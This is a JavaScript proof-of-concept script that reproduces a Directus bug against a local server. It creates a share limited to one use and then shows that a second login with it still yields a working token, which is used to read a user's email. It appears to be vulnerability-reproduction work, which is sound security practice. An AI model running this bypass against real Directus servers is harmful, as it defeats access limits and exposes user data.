const base = 'http://127.0.0.1:8055';

async function request(path, { method = 'GET', token, body } = {}) {
  const response = await fetch(base + path, {
    method,
    headers: {
      ...(body ? { 'content-type': 'application/json' } : {}),
      ...(token ? { authorization: `Bearer ${token}` } : {}),
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await response.text();
  let json;
  try { json = text ? JSON.parse(text) : {}; } catch { json = { raw: text }; }
  return { status: response.status, json };
}

async function expectStatus(label, result, expected) {
  if (result.status !== expected) {
    throw new Error(`${label}: expected HTTP ${expected}, got ${result.status}: ${JSON.stringify(result.json)}`);
  }
}

const email = process.env.ADMIN_EMAIL;
const password = process.env.ADMIN_PASSWORD;

let health;
for (let i = 0; i < 60; i++) {
  try {
    health = await request('/server/health');
    if (health.status === 200) break;
  } catch {}
  await new Promise((resolve) => setTimeout(resolve, 2000));
}
await expectStatus('Directus health', health, 200);
console.log('HTTP server is booted and healthy.');

const adminLogin = await request('/auth/login', {
  method: 'POST',
  body: { email, password },
});
await expectStatus('Admin login', adminLogin, 200);
const adminToken = adminLogin.json.data?.access_token;
if (!adminToken) throw new Error('Admin login did not return data.access_token');

const me = await request('/users/me?fields=id', { token: adminToken });
await expectStatus('Get admin user', me, 200);
const userId = me.json.data?.id;
if (!userId) throw new Error('Could not determine admin user ID');

const createShare = await request('/shares', {
  method: 'POST',
  token: adminToken,
  body: {
    name: 'HTTP max_uses security reproduction',
    collection: 'directus_users',
    item: userId,
    max_uses: 1,
  },
});
await expectStatus('Create share', createShare, 200);
const shareId = createShare.json.data?.id;
if (!shareId) throw new Error(`Share creation returned no ID: ${JSON.stringify(createShare.json)}`);
console.log(`Created share ${shareId} with max_uses=1.`);

const firstLogin = await request('/shares/auth', {
  method: 'POST',
  body: { share: shareId },
});
await expectStatus('First share login (consume allowed use)', firstLogin, 200);
if (!firstLogin.json.data?.access_token) throw new Error('First share login returned no access token');
console.log('First share login: HTTP 200 (usage limit consumed).');

const secondLogin = await request('/shares/auth', {
  method: 'POST',
  body: { share: shareId },
});
await expectStatus('Second share login after max_uses reached', secondLogin, 200);
const shareToken = secondLogin.json.data?.access_token;
if (!shareToken) throw new Error('Second share login returned no access token');
console.log('SECOND share login after max_uses=1: HTTP 200 and access token returned.');

const shareRecord = await request(`/shares/${shareId}?fields=id,max_uses,times_used`, { token: adminToken });
await expectStatus('Read share usage counter', shareRecord, 200);
const { max_uses: maxUses, times_used: timesUsed } = shareRecord.json.data ?? {};
if (maxUses !== 1 || timesUsed !== 2) {
  throw new Error(`Unexpected counter state: max_uses=${maxUses}, times_used=${timesUsed}`);
}
console.log(`Counter verified over HTTP: max_uses=${maxUses}, times_used=${timesUsed}.`);

const sharedRead = await request(`/items/directus_users/${userId}?fields=id,email`, { token: shareToken });
await expectStatus('Read shared item using second token', sharedRead, 200);
if (sharedRead.json.data?.id !== userId) {
  throw new Error(`Share token did not return the expected shared item: ${JSON.stringify(sharedRead.json)}`);
}
console.log('Shared item read using the SECOND token: HTTP 200.');
console.log('CONFIRMED: HTTP-level max_uses bypass reproduced against a booted Directus server.');
